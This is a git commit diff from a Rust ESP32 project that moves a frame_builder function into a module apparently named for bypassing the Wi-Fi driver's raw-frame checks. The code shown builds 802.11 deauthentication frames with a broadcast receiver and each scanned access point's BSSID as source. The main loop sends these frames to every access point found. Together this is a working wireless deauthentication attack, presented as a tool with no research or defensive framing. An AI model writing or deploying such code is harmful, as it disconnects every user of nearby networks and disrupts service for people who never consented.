1f52067c6bb9846c9d87bf2fb293767b7c4e699b
Brendan McShane <brendanmcs7@gmail.com>
2023-10-17 19:04:13 -0400

    Shift function to mod

--- src/main.rs
+++ src/main.rs
@@ -7,7 +7,7 @@ use esp_idf_svc::{
     eventloop::EspSystemEventLoop,
 };
 
-use crate::wsl_bypasser::send_freedom;
+use crate::wsl_bypasser::{send_freedom, frame_builder};
 
 mod wsl_bypasser;
 
@@ -34,26 +34,4 @@ fn main() {
     for ap in scan_results{
         send_freedom(WifiDeviceId::Ap, &frame_builder(ap.bssid)).unwrap();
     }
-}
-
-fn frame_builder(bssid: [u8; 6]) -> [u8; 26] {
-    let mut frame: [u8; 26] = [
-        /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
-        /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
-        /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
-        /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
-        /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
-        /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
-        /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
-    ];
-
-    for n in 0..2 {
-        let offset = 10+(6*n);
-        for i in 0..6{
-            frame[offset+i] = bssid[i];
-        }
-    }
-
-    // return the frame:
-    frame
 }
